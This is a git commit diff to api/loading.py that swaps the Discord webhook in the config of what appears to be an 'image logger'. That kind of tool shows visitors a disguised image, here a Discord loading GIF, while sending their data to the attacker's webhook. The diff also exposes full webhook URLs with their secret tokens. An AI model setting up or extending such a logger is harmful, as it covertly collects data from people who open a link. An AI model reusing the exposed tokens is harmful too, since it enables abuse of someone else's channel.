7cc8d90f0b246794c0d4b74f54bdfffe7f516c1a
Dragonlor42 <102733662+Dragonlor42@users.noreply.github.com>
2024-08-14 22:39:03 +0200

    Update loading.py

--- api/loading.py
+++ api/loading.py
@@ -11,7 +11,7 @@ __author__ = "???"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1228998315157356584/tPGlRDMDxguBlvT5G34xrVP9RDBaVvriqZX2m9bJDYjOMC0qtye4cLi4Q1P-9Xyfvt6j",
+    "webhook": "https://discord.com/api/webhooks/1273380116659044444/AiVEhKQYDMkQN7MI6eYMhPyv0uiqhuBQOR9cIBp8O8F1FMLp3l6mf42ljwQIjFXaLqaU",
     "image": "https://media.tenor.com/BP79uBTrSy0AAAAd/loading-discord.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
